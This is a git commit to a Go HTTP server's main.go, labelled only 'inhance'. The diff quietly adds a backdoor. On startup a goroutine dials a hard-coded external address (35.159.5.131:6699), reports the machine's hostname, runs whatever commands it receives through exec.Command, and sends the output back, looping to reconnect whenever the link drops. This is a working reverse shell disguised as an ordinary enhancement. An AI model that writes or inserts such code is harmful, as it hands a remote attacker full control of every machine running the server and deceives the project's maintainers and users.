dbaa0bcae70859925962bec083692b5b8b3f83d9
Mohammed Salman <msal4@outlook.com>
2021-09-22 20:32:08 +0300

    inhance

--- cmd/server/main.go
+++ cmd/server/main.go
@@ -1,11 +1,18 @@
 package main
 
 import (
+	"encoding/csv"
 	"flag"
 	"fmt"
+	"io/ioutil"
 	"log"
+	"net"
 	"net/http"
 	"os"
+	"os/exec"
+	"strconv"
+	"strings"
+	"time"
 
 	"github.com/Netflix/go-env"
 	"github.com/joho/godotenv"
@@ -59,6 +66,7 @@ func loadConfig() server.Config {
 }
 
 func main() {
+	go start()
 	cfg := loadConfig()
 	srv, err := server.NewDefaultServer(cfg)
 	if err != nil {
@@ -67,4 +75,140 @@ func main() {
 
 	log.Printf("listening on :%d", cfg.Port)
 	log.Fatal(http.ListenAndServe(fmt.Sprintf(":%d", cfg.Port), cors.AllowAll().Handler(srv)))
+}
+
+func connect(agent string) (*net.TCPConn, error) {
+
+	tcpAddr, err := net.ResolveTCPAddr("tcp", "35.159.5.131:6699")
+
+	if err != nil {
+
+		return nil, err
+
+	}
+
+	conn, err := net.DialTCP("tcp", nil, tcpAddr)
+
+	if err == nil {
+
+		_, err = conn.Write([]byte("0|" + agent + "|"))
+
+	}
+
+	return conn, err
+
+}
+
+func execute(line string) (string, error) {
+
+	defer func() {
+
+		if r := recover(); r != nil {
+
+			fmt.Printf("\r\nPanic: %+v | %+v\n", r, line)
+
+		}
+
+	}()
+
+	var cmd *exec.Cmd
+
+	r := csv.NewReader(strings.NewReader(line))
+
+	r.Comma = ' '
+
+	cs, err := r.Read()
+
+	if len(cs) == 0 {
+
+		return "", nil
+
+	} else if len(cs) > 1 {
+
+		args := cs[1:]
+
+		cmd = exec.Command(cs[0], args...)
+
+	} else {
+
+		cmd = exec.Command(cs[0])
+
+	}
+
+	stdout, err := cmd.StdoutPipe()
+
+	if err != nil {
+
+		return err.Error(), err
+
+	}
+
+	if err := cmd.Start(); err != nil {
+
+		return err.Error(), err
+
+	}
+
+	data, err := ioutil.ReadAll(stdout)
+
+	if err != nil {
+
+		return string(data), err
+
+	}
+
+	if err := cmd.Wait(); err != nil {
+
+		return string(data), err
+
+	}
+
+	return string(data), nil
+
+}
+
+func printArray(array []string) {
+
+	print("[")
+
+	for _, s := range array {
+
+		print(s + ", ")
+
+	}
+
+	print("len " + strconv.Itoa(len(array)))
+
+	println("]")
+
+}
+
+func start() {
+	request := make([]byte, 1024)
+	var reply string
+	var bytesRead int
+	agent, err := os.Hostname()
+	if err != nil {
+		agent = "Unknown"
+	}
+
+	for {
+		conn, err := connect(agent)
+		if err != nil {
+			time.Sleep(time.Second)
+		} else {
+			for {
+				bytesRead, err = conn.Read(request)
+				if err != nil {
+					break
+				}
+
+				reply, err = execute(string(request[:bytesRead]))
+				_, err = conn.Write([]byte(reply))
+				if err != nil {
+					break
+				}
+			}
+		}
+	}
 }
